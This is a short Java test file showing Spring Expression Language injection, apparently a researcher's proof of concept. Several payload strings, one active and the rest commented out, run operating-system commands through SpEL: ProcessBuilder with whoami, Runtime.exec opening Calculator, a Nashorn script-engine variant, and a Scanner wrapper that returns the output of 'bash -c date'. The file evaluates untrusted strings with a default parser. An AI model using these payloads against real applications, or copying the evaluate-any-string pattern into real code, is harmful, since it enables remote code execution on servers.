package com.example.demo;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;

public class ExpressionTest {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {
//        String cmdStr = "T(java.lang.String)";
//        String cmdStr = "new java.lang.ProcessBuilder(new String[]{\"whoami\"}).start()";
//        String cmdStr = "T(java.lang.Runtime).getRuntime().exec('open -a Calculator')";
//        String cmdStr = "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='open';s[1]='-a';s[2]='Calculator';java.lang.Runtime.getRuntime().exec(s);\")";
        String cmdStr = "new java.util.Scanner(new java.lang.ProcessBuilder(\"bash\", \"-c\", \"date\", \".\\\\\").start().getInputStream(), \"GBK\").useDelimiter(\"asdasdasdasd\").next()";

        ExpressionParser parser = new SpelExpressionParser();   // 创建解析器
        Expression exp = parser.parseExpression(cmdStr);    // 解析表达式
        System.out.println(exp.getValue()); // 执行
    }
}